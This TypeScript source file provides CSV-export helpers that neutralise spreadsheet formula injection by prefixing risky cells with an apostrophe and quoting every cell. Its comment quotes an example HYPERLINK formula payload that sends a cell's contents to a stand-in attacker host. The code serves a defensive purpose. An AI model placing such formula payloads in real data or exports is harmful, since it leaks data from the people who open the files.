/**
 * CSV for files a person will open in a spreadsheet.
 *
 * Some of these values are written by anonymous visitors (search queries,
 * page slugs). Excel, Sheets and LibreOffice evaluate any cell that starts with
 * `=`, `+`, `-`, `@`, tab or CR as a formula, so a query like
 * `=HYPERLINK("https://evil.example/?"&A2, "open")` ran on the admin's machine
 * the moment the export was opened. Such cells get a leading apostrophe, the
 * convention spreadsheets read as "this is text". Every cell is quoted, so a
 * comma or newline in a value cannot shift the columns either.
 */
const FORMULA_START = /^[=+\-@\t\r]/

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""'
  let text = value instanceof Date ? value.toISOString() : String(value)
  if (typeof value === "string" && FORMULA_START.test(text)) text = `'${text}`
  return `"${text.replace(/"/g, '""')}"`
}

export function csvRow(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(",")}\n`
}
